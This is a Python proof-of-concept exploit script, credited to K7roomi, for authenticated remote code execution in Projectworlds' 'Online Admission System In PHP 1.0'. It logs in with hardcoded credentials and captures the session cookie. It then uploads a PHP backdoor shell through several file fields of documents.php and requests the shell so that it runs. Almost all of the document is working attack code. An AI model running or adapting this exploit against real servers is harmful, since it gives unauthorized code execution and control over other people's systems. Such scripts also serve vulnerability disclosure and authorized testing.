"""

    - Online Admission System In PHP 1.0 Authentiated Remote Code Execution PoC -

    Projectworlds.in


    Script developed by K7roomi

"""

import requests
import time

# Change PATHS depending on your current path.

url = "http://localhost/cvehunt/index.php"
vuln_endpoint = "http://localhost/cvehunt/documents.php"
shell_web_path = "http://localhost/cvehunt/studentproof/"
shell_loc = "./shell.php"

def shell(phpsessid):

    print(f"[+] Uploading backdoor shell and spawning shell..")

    files = {
        "fpic": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "ftndoc": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "ftcdoc": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "fdmdoc": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "fdcdoc": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "fide": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "fsig": ("shell.php", open(shell_loc, "rb"), "application/x-httpd-php"),
        "fpicup": (None, "Submit"),
    }

    response = requests.post(vuln_endpoint, files=files, cookies={"PHPSESSID": phpsessid})

    # Print the response content
    print("[+] Attempting to spawn shell on webserver...")
    requests.get(f"{shell_web_path}/shell.php")

def login():

    # change u_id and u_ps if different credentials
    data = {
        "u_id": "CUTM00013",
        "u_ps": "0f6TiJci",
    }

    # Login and get PHPSESSID
    res = requests.post(url=url, data=data)
    phpsessid = res.cookies.get('PHPSESSID')
    if phpsessid:
        print(f"[+] Valid Session ID found: {phpsessid}")
    else:
        print(f"[!] PHPSESSID not found. Wrong login credentials, maybe?")
        exit()

    shell(phpsessid)

if __name__ == "__main__":
    print(f"[+] Pwning {url} on endpoint {vuln_endpoint}...")
    time.sleep(2)
    login()